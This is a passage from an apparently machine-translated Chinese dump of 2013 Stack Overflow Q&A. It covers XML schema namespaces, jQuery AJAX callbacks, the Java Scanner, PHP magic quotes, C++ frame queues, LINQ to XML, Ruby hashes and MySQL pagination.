  <xs:element name="fooDb">
    <xs:complexType>
      <xs:sequence>
        <xs:element ref="provider" minOccurs="1" maxOccurs="1" />
        <xs:element ref="connectionSettings" minOccurs="1" maxOccurs="1" />
      </xs:sequence>
      <xs:attribute name="version" type="version" />
    </xs:complexType>
  </xs:element>

  <xs:element name="provider" type="xs:string" />

  <!-- Individual providers provide their own connection settings. -->
  <xs:element name="connectionSettings">
    <xs:complexType>
      <xs:sequence>
        <xs:any processContents="strict" minOccurs="0" maxOccurs="unbounded"
                namespace="##other" />
      </xs:sequence>
    </xs:complexType>
  </xs:element>

  <!-- Requires that an element be empty. -->
  <xs:simpleType name="empty">
    <xs:restriction base="xs:string">
      <xs:enumeration value=""/>
    </xs:restriction>
  </xs:simpleType>

  <!-- Current version is 1.0.0.0\. -->
  <xs:simpleType name="version">
    <xs:restriction base="xs:string">
      <xs:enumeration value="1.0.0.0"/>
    </xs:restriction>
  </xs:simpleType>

</xs:schema> 
```

一个特定的提供者，我们称之为“SomeProvider”，定义了它自己的连接设置：

```
<?xml version="1.0" encoding="utf-8"?>
<xs:schema id="SomeProviderConfiguration"
    xmlns="http://tempurl.org/2013/01/Example.SomeProvider"
    xmlns:xs="http://www.w3.org/2001/XMLSchema"
    targetNamespace="http://tempurl.org/2013/01/Example.SomeProvider"
    elementFormDefault="qualified">

  <xs:element name="connectionSettings">
    <xs:complexType>
      <xs:sequence>
        <xs:element name="protocol" type="protocol" />
        <xs:element name="server" type="xs:string" />
        <xs:element name="port" type="port" />
        <xs:element name="project" type="xs:string" />
      </xs:sequence>
    </xs:complexType>
  </xs:element>

  <xs:simpleType name="protocol">
    <xs:restriction base="xs:string">
      <xs:enumeration value="http" />
      <xs:enumeration value="https" />
    </xs:restriction>
  </xs:simpleType>

  <xs:simpleType name="port">
    <xs:restriction base="xs:int">
      <xs:minInclusive value="0" />
      <xs:maxInclusive value="65535" />
    </xs:restriction>
  </xs:simpleType>

</xs:schema> 
```

当我尝试验证这一点时，我遇到了失败，因为外部架构期望`<connectionSettings>`节点被定义为“Example”命名空间的一部分，但它确实属于“Example.SomeProvider”命名空间（至少正如我在上面定义的那样）。

这样的事情是否可以以这种方式在模式中表达，还是我必须求助于模式包含方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T17:45:15.500

如果我使用您提供的示例 XML，则不得在“示例”命名空间中定义“连接设置”。你的 fooDb 看起来像

```
<xs:element name="fooDb">
    <xs:complexType>
      <xs:sequence>
        <xs:element ref="provider" minOccurs="1" maxOccurs="1" />
        <xs:any processContents="strict" minOccurs="1" maxOccurs="1"
                namespace="##other" />
      </xs:sequence>
    </xs:complexType>
</xs:element> 
```

但我猜你试图强制提供者覆盖“connectionSettings”而不共享与“示例”相同的命名空间。我不认为这是可能的。

如果你真的想确保“connectionSettings”是“Example”命名空间的一部分，那么提供者需要像下面这样调整他们的 XSD

```
 <?xml version="1.0" encoding="utf-8"?>
<xs:schema id="SomeProviderConfiguration"
    xmlns="http://tempurl.org/2013/01/Example.SomeProvider"
    xmlns:par="http://tempurl.org/2013/01/Example"
    xmlns:xs="http://www.w3.org/2001/XMLSchema"
    targetNamespace="http://tempurl.org/2013/01/Example.SomeProvider"
    elementFormDefault="qualified">

        <xs:element name="protocol" type="protocol" />
        <xs:element name="server" type="xs:string" />
        <xs:element name="port" type="port" />
        <xs:element name="project" type="xs:string" />

  <xs:simpleType name="protocol">
    <xs:restriction base="xs:string">
      <xs:enumeration value="http" />
      <xs:enumeration value="https" />
    </xs:restriction>
  </xs:simpleType>

  <xs:simpleType name="port">
    <xs:restriction base="xs:int">
      <xs:minInclusive value="0" />
      <xs:maxInclusive value="65535" />
    </xs:restriction>
  </xs:simpleType>

</xs:schema> 
```

或者 XML 实例必须如下所示

```
<?xml version="1.0" encoding="UTF-8"?>
<p:fooDb xmlns:p="http://tempurl.org/2013/01/Example" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
    xsi:schemaLocation="..."
    xmlns:inc="http://tempurl.org/2013/01/Example.SomeProvider">
  <p:provider>p:provider</p:provider>
    <p:connectionSettings>
      <protocol xsi:type="inc:protocol" xmlns="http://tempurl.org/2013/01/Example.SomeProvider">https</protocol>
      <server xmlns="http://tempurl.org/2013/01/Example.SomeProvider">localhost</server>
      <port xsi:type="inc:port" xmlns="http://tempurl.org/2013/01/Example.SomeProvider">8001</port>
      <project xmlns="http://tempurl.org/2013/01/Example.SomeProvider">example</project>
    </p:connectionSettings>
</p:fooDb> 
```

# jquery - JQuery - 向回调函数发送额外参数

> ID：14469790
> 
> 赞同：0
> 
> 时间：2013-01-22T23:12:48.040
> 
> 标签：jquery, ajax, json, parameters

当使用 $.ajax() 函数从服务器端脚本发送信息请求时，可以将参数传递给回调函数吗？

例子：

```
var params = ['param1', 'param2', 'param3']; 
for (var i = 0; i < params.length; i++) {
    $.ajax({
        url: url,
        dataType: "json",
        success: function(json, textStatus, jqXHR){
            console.log(params[i]);             
        }
    });
} 
```

但它不起作用。你有想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T23:37:54.107

两者`params`和都`i`存在于全局命名空间中，因此假设 AJAX 调用比 for 循环花费更长的时间（男孩，它更好） ，每个`success`都会为您获取 的最后一个值。`i`

将您的 AJAX 调用包装在一个函数中并将参数传递给该函数。然后，您可以直接从内部调用它`success`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T23:18:08.493

您必须使用该选项将其传递给您的 url，`data`然后在响应中返回它，从而将其包含在异步成功回调中。

顺便说一句，您可能应该将整个 ajax 位包装在循环外的函数中，`for`并从循环内调用它。像这样

```
var params = ['param1', 'param2', 'param3']; 

function do_stuff(param){
    $.ajax({
        url: url,
        dataType: "json",
        data: {
            'param' : param
        },
        success: function(json, textStatus, jqXHR){
            console.log(json.param);    
        }
    });
}

for (var i = 0; i < params.length; i++) {
  do_stuff(params[i]);
} 
```

# iphone - UIToolBar 中的 UISearchBar 不会成为第一响应者

> ID：14469793
> 
> 赞同：1
> 
> 时间：2013-01-22T23:13:09.473
> 
> 标签：iphone, ios, uisearchbar

我已经在 UIToolBar 中添加了 UISearchBar 和界面生成器，然后我在我的班级中将 UISearchBar 与 IBOutlet 连接起来，我已经这样做了：

```
- (void)viewDidAppear:(BOOL)animated
{
[self.mySearchBar becomeFirstResponder];
} 
```

但是键盘没有出现，我必须触摸uisearchbar才能让键盘出现，当视图出现时如何让键盘出现在uisearchbar上？

# java - Java 正则表达式空白无法识别

> ID：14469794
> 
> 赞同：1
> 
> 时间：2013-01-22T23:13:14.957
> 
> 标签：java, regex, whitespace

我正在尝试使用“java.util.regex.Pattern”从文本文件中捕获分配操作。我一直非常沮丧试图修复我的正则表达式以真正识别我正在寻找的内容。我尽可能地简化了问题，并发现了拾取空白的问题。

[这篇文章被证明是有帮助](https://stackoverflow.com/questions/4731055/whitespace-matching-regex-java)的，并阐明了处理空白字符集的问题，但没有回答为什么以下内容不起作用的问题：

```
Pattern p = Pattern.compile("adfa =");
Scanner sc = new Scanner("adfa =");

if(sc.hasNext(p))
{
    String s = sc.next(p);
    System.out.println(">" + s + "<");
}
else
    System.out.println(":("); 
```

如果我试试这个：

```
Pattern p = Pattern.compile("\\w+ *="); 
```

拾取以下字符串：

```
"adfa=" 
```

但不是：

```
"adfa =" 
```

只需进行以下更改：

```
Pattern p = Pattern.compile("adfa=");
Scanner sc = new Scanner("adfa="); 
```

一切按预期工作！任何人都可以阐明发生了什么问题吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-22T23:19:10.743

从文档中，[`Scanner#hasNext(Pattern)`](http://docs.oracle.com/javase/7/docs/api/java/util/Scanner.html#hasNext%28java.util.regex.Pattern%29)： -

> 如果下一个完整的标记与指定的模式匹配，则返回 true。完整的标记由匹配分隔符模式的输入添加前缀和后缀。

现在，由于默认的分隔符模式`Scanner`是`\p{javaWhitespace}+`. 通过使用方法找出它[`Scanner#delimiter()`](http://docs.oracle.com/javase/7/docs/api/java/util/Scanner.html#delimiter%28%29)： -

```
Scanner sc = new Scanner("abdc =");
System.out.println(sc.delimiter());  // Prints \p{javaWhitespace}+ 
```

因此，当您在字符串中`Scanner`遇到 a时。`whitespace`它假设`token`已经结束。因此停在那里，并尝试将读取的令牌与您的模式匹配。当然它失败了，因此`sc.hasNext(p)`return `false`。这就是问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-22T23:28:47.320

从[Scanner.hasNext(Pattern) javadoc：](http://docs.oracle.com/javase/6/docs/api/java/util/Scanner.html#hasNext%28java.util.regex.Pattern%29) *如果下一个完整标记与指定模式匹配，则返回 true。完整的标记由匹配分隔符模式的输入添加前缀和后缀。*

在 Scanner 中，withespace 是默认分隔符，因此在您的示例中，Scanner 尝试将令牌“adfa”与不匹配的正则表达式匹配。如果您将分隔符更改为其他内容，例如换行符：

```
sc.useDelimiter("\n"); 
```

您的正则表达式应该可以工作。

编辑：我的回答有点晚了！

# php - 如何将用户提交的报价保留为图片中的报价

> ID：14469796
> 
> 赞同：0
> 
> 时间：2013-01-22T23:13:42.240
> 
> 标签：php, string, gd

希望有人能够告诉我如何在生成图像时保留用户引用。我的意思是，如果用户提交如下字词：

> 别

或者

> 约翰说“你好”

如何将它们保留在生成的图像中。目前它变成

> 不

这是我的代码：

```
<?php

function formattextimg( $text, $width = 960, $color = array( 0, 0, 0 ),$bgcolor = array( 255, 255, 255 ), $font = 2 ) {
$width = ( ( isset( $width ) && is_numeric( $width ) ) ? ( ( $width >= 100 ) ? (int)$width : 100 ) : 960 );
$text = str_replace( array( '<b>', '</b>', '<strong>', '</strong>' ), '|', $text );
$text_b = preg_split( '/\|/', $text, -1, PREG_SPLIT_OFFSET_CAPTURE );
foreach($text_b as $k => $tb){if($k%2!=0){$textbold[($tb[1]-1)]=$tb[0];}}
$text = str_replace('|','',$text);
for( $i = 0; $i < strlen( $text ); $i++ ) {
    if( $string_c >= ( $width - ( (int)(imagefontwidth( $font ) / 2 ) ) ) ) {
        $space = strrpos( $string, ' ' );
        $string_sub = substr( $string, 0, $space );
        $i = $i - ( strlen( $string ) - $space ) + 1;
        $strings[] = $string_sub;
        $string = '';
        $string_c = 0;
    }
    $string .= $text{$i};
    $string_c += imagefontwidth( $font );
}
$strings[] = $string;

$im = imagecreatetruecolor( $width, ( imagefontheight( $font ) * ( count( $strings ) ) ) );
imagesavealpha( $im, true );
$trans = imagecolorallocate( $im, $bgcolor[0], $bgcolor[1], $bgcolor[2] );
imagefill( $im, 0, 0, $trans );
$color = imagecolorallocate( $im, $color[0], $color[1], $color[2] );
$black = imagecolorallocate( $im, 0, 0, 0 );
foreach( $strings as $pos => $string ) {
    imagestring( $im, $font, 5, ( $pos * imagefontheight( $font ) ), $string, $color );
}
$len = 0;
foreach( $strings as $pos => $string ) {
    $len += ( strlen( $string ) + 1 );
    if( count( $textbold ) > 0 ) {
        foreach( $textbold as $cpos => $word ) {
            if( $cpos <= $len ) {
                $wpos = strpos( $string, $word );
                if( $wpos !== false ) {
                    imagestring( $im, $font, 
                        ( $wpos * imagefontwidth( $font ) )+1, 
                        ( ( $pos ) * imagefontheight( $font ) ), 
                        $word, $color
                    );
                        unset( $textbold[$cpos] );
                    }
                }
        }
        }
    }
    return $im;
}

header( 'Content-type: image/png' );
imagepng( formattextimg( $text,300,array( 255, 255, 255 ),array( 128, 128, 128 ),16 ) );
exit;
?> 
```

如果那不可能，有人可以告诉我如何删除：

> '

和

> "

我试过：

```
$text=$_REQUEST['text'];
$text=str_replace('"', "", $text);
$text=str_replace("'", "", $text); 
```

但它没有用。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T23:22:30.063

这是由服务器上启用了[magic_quotes_gpc引起的。](http://no.php.net/manual/en/info.configuration.php#ini.magic-quotes-gpc)

`magic_quotes_gpc`您可以通过调用`stripslashes`if `get_magic_quotes_gpc`( [manual](http://no.php.net/manual/en/function.get-magic-quotes-gpc.php) ) 返回 true来反转效果：

```
$text = $_REQUEST['text'];

if (get_magic_quotes_gpc())
{
    $text = stripslashes($text);
} 
```

在调用 stripslashes 之前实际检查 get_magic_quotes 的值很重要，因为此功能在 PHP 5.3 中已被弃用，并从 PHP 5.4 中完全删除。

# c++ - 将帧保存到磁盘时防止丢帧

> ID：14469799
> 
> 赞同：1
> 
> 时间：2013-01-22T23:14:13.373
> 
> 标签：c++, multithreading, video-streaming, message-queue

我正在尝试编写将传入的视频帧保存到磁盘的 C++ 代码。**异步**到达的帧由生产者线程推送到队列中。消费者线程将帧从队列中弹出。生产者和消费者的相互排斥是使用互斥体完成的。但是，我仍然注意到帧被丢弃。丢弃的帧（可能）对应于生产者尝试将当前帧推入队列但由于消费者持有锁而无法这样做的实例。有什么建议么 ？我基本上不希望制片人等待。等待消费者对我来说没问题。

EDIT-0：不涉及锁定的替代想法。这行得通吗？

1.  Producer 最初将`n`几秒钟的视频排入队列。`n`可以是帧速率的一些小的倍数。
2.  只要队列包含`>= n`几秒钟的视频，消费者就会逐帧出列并保存到磁盘。
3.  视频完成后，队列被刷新到磁盘。

EDIT-1：帧以约 15 fps 的速度到达。

EDIT-2：代码大纲：

### 主驱动代码

```
 // Main function
 void LVD::DumpFrame(const IplImage *frame)
 {

     // Copies frame into internal buffer.
     // buffer object is a wrapper around OpenCV's IplImage
     Initialize(frame);

     // (Producer thread) -- Pushes buffer onto queue 
     // Thread locks queue, pushes buffer onto queue, unlocks queue and dies
     PushBufferOntoQueue();

     // (Consumer thread) -- Pop off queue and save to disk
     // Thread locks queue, pops it, unlocks queue,
     // saves popped buffer to disk and dies                
     DumpQueue();

     ++m_frame_id;
}

void LVD::Initialize(const IplImage *frame)
{

    if(NULL == m_buffer) // first iteration 
         m_buffer = new ImageBuffer(frame);         
    else    
         m_buffer->Copy(frame); 
} 
```

### 制片人

```
void LVD::PushBufferOntoQueue()
{   
     m_queingThread = ::CreateThread( NULL, 0, ThreadFuncPushImageBufferOntoQueue, this, 0, &m_dwThreadID);
}

 DWORD WINAPI LVD::ThreadFuncPushImageBufferOntoQueue(void *arg)
 {

     LVD* videoDumper = reinterpret_cast<LVD*>(arg);
     LocalLock ll( &videoDumper->m_que_lock, 60*1000 ); 
     videoDumper->m_frameQue.push(*(videoDumper->m_buffer));
     ll.Unlock();   
     return 0;
 } 
```

### 消费者

```
void LVD::DumpQueue()
{   
    m_dumpingThread = ::CreateThread( NULL, 0, ThreadFuncDumpFrames, this, 0, &m_dwThreadID);       
}

 DWORD WINAPI LVD::ThreadFuncDumpFrames(void *arg)
 {
        LVD* videoDumper = reinterpret_cast<LVD*>(arg);

        LocalLock ll( &videoDumper->m_que_lock, 60*1000 );
        if(videoDumper->m_frameQue.size() > 0 )
        {
           videoDumper->m_save_frame=videoDumper->m_frameQue.front();
           videoDumper->m_frameQue.pop();
        }
        ll.Unlock();    

    stringstream ss;
    ss << videoDumper->m_saveDir.c_str() << "\\";
    ss << videoDumper->m_startTime.c_str() << "\\";     
    ss << setfill('0') << setw(6) << videoDumper->m_frame_id;
    ss << ".png";       
    videoDumper->m_save_frame.SaveImage(ss.str().c_str());

    return 0; 
```

}

笔记：

(1) 我不能使用 C++11。因此，[Herb Sutter 的 DDJ 文章](http://www.drdobbs.com/parallel/writing-lock-free-code-a-corrected-queue/210604448?pgno=1)不是一个选择。

(2) 我找到了一个无界的单一生产者-消费者队列的[引用。](http://www.1024cores.net/home/lock-free-algorithms/queues/unbounded-spsc-queue)但是，作者指出排队（添加帧）可能不是免等待的。

(3) 我还找到了[liblfds](http://www.liblfds.org/)，一个 C 库，但不确定它是否能达到我的目的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-23T00:08:43.347

队列不可能是问题。视频帧以 16 毫秒的间隔到达，最坏的情况。您的队列只需要存储一个指向帧的指针。以线程安全的方式添加/删除一个*永远不会*超过一微秒。

您需要寻找其他解释和解决方案。视频确实永远存在消防水管问题。磁盘驱动器的速度通常不足以跟上未压缩的视频流。因此，如果您的消费者无法跟上生产者的步伐，那么就会有所作为。当您（正确地）阻止队列无限制地增长时，可能会出现丢帧的结果。

请务必考虑对视频进行编码。提供实时 MPEG 和 AVC 编码器。在他们压缩流之后，您应该不会有跟上磁盘的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T23:29:52.087

圆形缓冲区绝对是一个不错的选择。如果你让它使用 2^n 大小，你也可以使用这个技巧来更新指针：

```
inline int update_index(int x) 
{
   return (x + 1) & (size-1);
} 
```

这样，就不需要使用昂贵的比较（和相应的跳转）或除法（任何处理器中单个最昂贵的整数操作 - 不计算“填充/复制大块内存”类型的操作）。

在处理视频（或一般的图形）时，必须进行“缓冲区管理”。通常，这是跟踪“帧缓冲区”状态并避免复制不必要的内容的情况。

典型的方法是分配 2 或 3 个视频缓冲区（或帧缓冲区，或您所说的）。缓冲区可以由生产者或消费者拥有。转让只是所有权。因此，当视频驱动程序发出“此缓冲区已满”的信号时，所有权现在属于消费者，消费者将读取缓冲区并将其存储到磁盘 [或其他]。当存储完成时，缓冲区被归还（“释放”），以便生产者可以重新使用它。将数据复制出缓冲区是昂贵的 [需要时间]，因此除非绝对必要，否则您不想这样做。

# c# - 在 C# 中使用 LINQ 解析 XML

> ID：14469802
> 
> 赞同：4
> 
> 时间：2013-01-22T23:14:25.137
> 
> 标签：c#, xml-parsing, linq-to-xml

在这个 xml 文件 (http://www.studiovincent.net/list.xml) 中：

```
<list version="1.0">
  <meta>
    <type>resource-list</type>
  </meta>
  <resources start="0" count="4">
    <resource classname="Quote">
      <field name="name">Vincent</field>
      <field name="username">Hill</field>
      <field name="age">31</field>
      <field name="hair">black</field>
    </resource>
    <resource classname="Quote">
      <field name="name">John</field>
      <field name="username">Tedelon</field>
      <field name="age">27</field>
      <field name="hair">brown</field>
    </resource>
    <resource classname="Quote">
      <field name="name">Michael</field>
      <field name="username">Lopez</field>
      <field name="age">20</field>
      <field name="hair">red</field>
    </resource>
    <resource classname="Quote">
      <field name="name">Frank</field>
      <field name="username">Lopez</field>
      <field name="age">25</field>
      <field name="hair">black</field>
    </resource>
  </resources>
</list> 
```

使用此代码：

```
using System.Xml;
using.System.Xml.Linq;

XmlReader reader = XmlReader.Create("http://www.studiovincent.net/list.xml");
XElement el = XElement.Load(reader);
reader.Close();

var items = el.Elements("resources").Elements("resource").Descendants().DescendantNodes();

var items = from item in el.Elements("resources").Elements("resource").Descendants() 
            where item.Attribute("name").Value == "name" select item.FirstNode;

foreach (XNode node in items)
{
    Console.WriteLine(node.ToString());
} 
```

我有这个输出：

```
Vincent
John
Michael
Frank 
```

代码工作得很好，但我需要获取值**31**，它对应于字段名称 =“年龄”，其中字段名称 =“名称”是文森特。我怎样才能得到这个结果？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-23T00:23:06.993

我建议您像自然阅读 XML 时那样做。

在您的代码中，尝试查找`name`属性设置为的所有字段`"name"`。

此过程不能用于将姓名与年龄相关联。`resource`阅读 XML 并检查所有元素更为自然。然后向此元素添加元素中描述的一些信息`field`。

```
// Using LINQ to SQL
XDocument document = XDocument.Load("http://www.studiovincent.net/list.xml");  // Loads the XML document.
XElement resourcesElement = document.Root.Element("resources");  // Gets the "resources" element that is in the root "list" of the document.

XElement resourceElementVincent = (from resourceElement in resourcesElement.Elements("resource")// Gets all the "resource" elements in the "resources" element
                                    let fieldNameElement = resourceElement.Elements("field").Single(fieldElement => fieldElement.Attribute("name").Value == "name")  // Gets the field that contains the name (there one and only one "name" field in the "resource" element -> use of Single())
                                    where fieldNameElement.Value == "Vincent"  // To get only resources called "Vincent"
                                    select resourceElement).Single();  // We suppose there is one and only 1 resource called "Vincent" -> Use of Single()
XElement fieldAgeElement = resourceElementVincent.Elements("field").Single(fieldElement => fieldElement.Attribute("name").Value == "age");  // Gets the corresponding "age" field
int age = int.Parse(fieldAgeElement.Value, CultureInfo.InvariantCulture);  // Gets the age by Parse it as an integer
Console.WriteLine(age); 
```

它做你想做的事吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-03-11T13:24:42.747

考虑下面的 XML 作为 SQL 表的列之一。

```
<Root>
  <Name>Dinesh</Name>
  <Id>2</Id>
</Root> 
```

查询的目标是从 XML 中获取名称。在此示例中，我们将获取“Dinesh”作为值。

```
var Query = (from t in dbContext.Employee.AsEnumerable()
where t.active == true 
select new Employee
{
    Id = t.AtpEventId,  
    Name = XDocument.Parse(t.Content).Descendants("Root").Descendants("Name").ToList().  
    Select(node => node.Value.ToString()).FirstOrDefault()  
}); 
```

请注意以下事项：

1.  `t.active == true`只是一个例子，如果需要的话，可以做一些条件。

2.  请注意，在上面的 LINQ 查询中，始终使用 AsEnumerable，就像我在第一行中所做的那样。

3.  `Descendants("Root").Descendants("Name")`- 这里“Root”应该是与 XML 匹配的元素，在 Root 下我们有 Name 元素。

# c# - C#：正则表达式匹配最接近

> ID：14469804
> 
> 赞同：0
> 
> 时间：2013-01-22T23:14:36.457
> 
> 标签：c#, html, regex, pattern-matching, closest

```
<table class="listProvision" class="itable">
    <tr>
        <td class="whatever">some infos</td>
        <td>some more infos</td>
        <td>13908402</td>
        <td>hello world</td>
    </tr>
    <tr>
        <td class="whatever">some infos</td>
        <td>some more infos</td>
        <td id="num">13908402</td>
        <td>hello world</td>
    </tr>
</table> 
```

鉴于上面的示例 HTML，**我如何正确解析with 类`<tr>...</tr>`之间的`table``listProvision`**所有存在？

我试过：`<table.*?listProvision.*?>(?:.*?<tr.*?>(.*?)</tr>)+.*?</table>`，但我不知道出了什么问题。永远不会有任何复杂的 html 被拉入这个正则表达式，所以不用担心。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T23:33:34.567

这是如何使用[Html Agility Pack解析 html 字符串的示例](http://www.codeplex.com/htmlagilitypack)

```
HtmlDocument doc = new HtmlDocument();
doc.LoadHtml(html);

var rows = doc.DocumentNode
              .SelectNodes("//table[@class='listProvision']/tr"); 
```

然后你可以使用`HtmlNode.InnerHtml`属性来获取`<tr>...</tr>`标签之间的所有数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-23T00:06:44.863

1)`RegexOptions.Singleline`用于[使点匹配换行符。](http://www.regular-expressions.info/dot.html)（你的正则表达式已经工作了，我在[这里](http://regexr.com?33gb4)只用单行标志就可以了）

2）[访问](https://stackoverflow.com/questions/5982451/regex-capturing-a-repeated-group) `match.Groups["yourNamedCaptureGroup"].Captures`您的捕获。

# ruby - `[]': 无法将字符串转换为整数 (TypeError) Ruby

> ID：14469808
> 
> 赞同：0
> 
> 时间：2013-01-22T23:14:52.007
> 
> 标签：ruby, hash

我正在尝试遍历 JSON 解析的哈希表（具有嵌套的哈希数组）并插入到 Text Table 中。我试图迭代的 JSON 解析代码是：

```
{"server"=>{"security_groups"=>[{"name"=>"default"}], "adminPass"=>"LhXEPMkYmqF7",   "id"=>"82b7e32b-f62b-4106-b499-e0046250229f", "links"=>[{"href"=>"http://10.30.1.49:8774/v2/89fc0b9d984d49fba5328766e923958f/servers/82b7e32b-f62b-4106-b499-e0046250229f", "rel"=>"self"}, {"href"=>"http://10.30.1.49:8774/89fc0b9d984d49fba5328766e923958f/servers/82b7e32b-f62b-4106-b499-e0046250229f", "rel"=>"bookmark"}], "OS-DCF:diskConfig"=>"MANUAL"}} 
```

我用来迭代顶部的代码是：

```
server_table = Text::Table.new do | t |
      t.head = ['Server ID', 'Server URL', 'Admin Password']
   end
response = JSON.parse(r)

response['server'].each do | serv_info |
  server_table.rows << [["#{serv_info['id']}", "#{serv_info['links'][0]['href']}", "#{serv_info['adminPass']}"]]
end

puts server_table 
```

我收到错误消息：

```
/lib/get_token.rb:166:in `[]': can't convert String into Integer (TypeError)
    from ./lib/get_token.rb:166:in `create_server'
    from ./lib/get_token.rb:165:in `each'
    from ./lib/get_token.rb:165:in `create_server' 
```

如果我单独使用 puts 打印出每个命令，它们可以正常工作，但迭代不会。提取正确信息的命令是：

```
puts response['server']['links'][0]['href']
puts response['server']['id']
puts response['server']['adminPass'] 
```

所有这三个工作，但如果我尝试迭代它们，我会得到字符串错误。我知道它与 .each 返回一个哈希数组有关，但我不完全理解为什么 PUTS 命令在脚本和 IRB 中都没有问题。

有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T23:38:18.303

每个`serv_info`都是一对表示为 2 个元素的数组的映射。因此`<<`，您代码中的所有内容都是错误的。

避免此类错误的秘诀是停止尝试混淆您自己的代码。

`server_table.rows`应该包含所有可能的三元组服务器 ID、链接和密码。

```
response = # { "server" => ...}
server = response['server']
server_id = server['id']
link_infos = server['links']
admin_pass = server['adminPass']

link_infos.each do |link_info|
  link = link_info['href']
  server_table.rows << [server_id, link, admin_pass]
end 
```

*更新*

我们可以很容易地使用这段代码来处理多个服务器

```
response = # [ {"server" => ...}, ...]
response.each do |server|
   ... # above code snippet goes here 
       # or you may extract it into a method and call it here
end 
```

另外我想提一下，这`irb`对于处理这类问题非常有用。它是一个命令行 Ruby 解释器，非常适合原型设计。它会打印出您键入的每个语句的结果，并具有自动完成功能以帮助您找到所需的类/方法。无需等待几个小时才能获得简单问题的 SO 答案，您将`irb`在几分钟内使用它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T23:21:00.093

也许你的意思只是

```
serv_info = response['server']
server_table.rows << [["#{serv_info['id']}", "#{serv_info['links'][0]['href']}",      "#{serv_info['adminPass']}"]] 
```

因为`response['server']`是散列而不是数组。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T23:34:43.893

而不是使用：

```
server_table.rows << [["#{serv_info['id']}", "#{serv_info['links'][0]['href']}", "#{serv_info['adminPass']}"]] 
```

尝试：

```
server_table.rows += [["#{serv_info['id']}", "#{serv_info['links'][0]['href']}", "#{serv_info['adminPass']}"]] 
```

或者：

```
server_table.rows << ["#{serv_info['id']}", "#{serv_info['links'][0]['href']}", "#{serv_info['adminPass']}"] 
```

# ruby - 如何使用 Tweetstream Ruby gem 获得 Twitter 关注请求？

> ID：14469813
> 
> 赞同：0
> 
> 时间：2013-01-22T23:15:22.837
> 
> 标签：ruby, twitter, tweetstream

根据此 Ars Technica 教程，“流式 API 可以轻松检测用户何时获得新关注者。要检测关注事件对象，请查找“事件”键并检查它是否具有字符串“关注”作为值。”

[http://arstechnica.com/information-technology/2010/04/tutorial-use-twitters-new-real-time-stream-api-in-python/2/](http://arstechnica.com/information-technology/2010/04/tutorial-use-twitters-new-real-time-stream-api-in-python/2/)

推文流 gem 应该公开 API 中的所有方法。但是我不知道如何获得那些关注请求！

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-19T08:37:43.447

tweetstream gem 相当完整，但有时您需要深入研究源代码才能找到东西：

```
client.on_event(:follow) do |event|
  p event[:source][:screen_name]
end 
```

[https://github.com/intridea/tweetstream/blob/master/lib/tweetstream/client.rb#L375](https://github.com/intridea/tweetstream/blob/master/lib/tweetstream/client.rb#L375) :)

# mysql - 如何根据列分配记录

> ID：14469821
> 
> 赞同：3
> 
> 时间：2013-01-22T23:15:39.517
> 
> 标签：mysql, sql, distribution

我有一个存储竞赛条目的表格。参赛者必须输入文字，并且可以选择上传照片

当我在页面上显示条目时，我一次分页到 9 个。

如何尽可能确保每一页至少包含一个带有照片的条目（假设每页有足够的照片条目）？在页面之间均匀分布带有照片的条目可能就足够了

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T00:24:33.437

我建议您随机排序行：

```
order by rand() 
```

这并不能保证每页上都有一张照片，但它会有所帮助。

另一种方法是执行以下操作：

```
select *, @seqnum:=@seqnum+1
from t
where nophoto
select *, @seqnum:=@seqnum+8
from t
where photo 
```

然后按seqnum排序。使这变得麻烦的是处理每页少于一张照片和多张照片的情况。随机方法可能就足够了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-23T00:32:03.510

对于每一页，执行以下操作（例如，对于第 3 页，页面大小为 10）：

```
select ...
from ...
where has_photo
order by created
limit 3, 1
union
select ...
from ...
where not has_photo
order by created
limit 27, 9 
```

此查询将两种类型的行分解为两个由联合重新组合的单独查询。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-23T02:12:45.350

这是我最近看到的更具挑战性的问题之一——谢谢！我无法使用单个 SQL 语句让它工作，但我能够让它像这样工作（至少它看起来）。基本上，它会尝试确定将返回多少结果，然后其中有多少有照片，并使用照片的百分比除以页数（使用 CEILING 确保前几页至少有一个）。

无论如何，这里是：

```
SET @page = 1;
SET @resultsPerPage = 9;

SELECT @recCount:= COUNT(Id) as RecCount
FROM Entries;

SELECT @photoCount:= COUNT(Photo) as PhotoCount
FROM Entries
WHERE Photo IS NOT NULL;

SET @pageCount = CEILING(@recCount/@resultsPerPage);
SET @photosPerPage = CEILING(@photoCount/@pageCount);
SET @nonPhotosPerPage = @resultsPerPage - CEILING(@photosPerPage);

SELECT *
FROM (
      SELECT *, 
        @rownum := @rownum + 1 row_number
      FROM Entries JOIN    (SELECT @rownum := 0) r
      WHERE Photo IS NOT NULL
   ) a 
WHERE a.row_number > (@photosPerPage*(@page-1))
   and a.row_number <= (@photosPerPage*(@page))
UNION 
SELECT *
FROM (
      SELECT *, 
        @rownum2 := @rownum2 + 1 row_number
      FROM Entries JOIN    (SELECT @rownum2 := 0) r
      WHERE Photo IS NULL
   ) b
WHERE b.row_number > (@nonPhotosPerPage*(@page-1))
   and b.row_number <= (@nonPhotosPerPage*(@page)) 
```

还有[SQL 小提琴](http://sqlfiddle.com/#!9/ddbc7/6)。

祝你好运！

# jquery - 我想更好地理解 jQuery '$' 符号

> ID：14469829
> 
> 赞同：-2
> 
